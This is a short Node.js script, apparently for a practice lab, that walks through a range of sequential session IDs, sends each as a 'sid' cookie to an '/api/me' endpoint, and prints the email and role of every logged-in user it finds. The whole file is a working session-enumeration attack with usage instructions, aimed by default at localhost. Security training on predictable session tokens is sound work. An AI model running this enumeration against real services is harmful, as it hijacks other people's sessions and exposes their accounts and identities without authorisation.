// Try a range of session ids and report the ones that belong to a logged-in user. Practice app only.
// Usage: node find-sessions.mjs <base-url> <first-id> <last-id>
const [base = 'http://127.0.0.1:18401', first = '1001', last = '1010'] = process.argv.slice(2);
for (let id = Number(first); id <= Number(last); id++) {
  const res = await fetch(`${base}/api/me`, { headers: { Cookie: `sid=${id}` } });
  if (res.status === 200) {
    const me = await res.json();
    console.log(`sid=${id}  logged in as ${me.email} (${me.role})`);
  }
}
console.log('done');
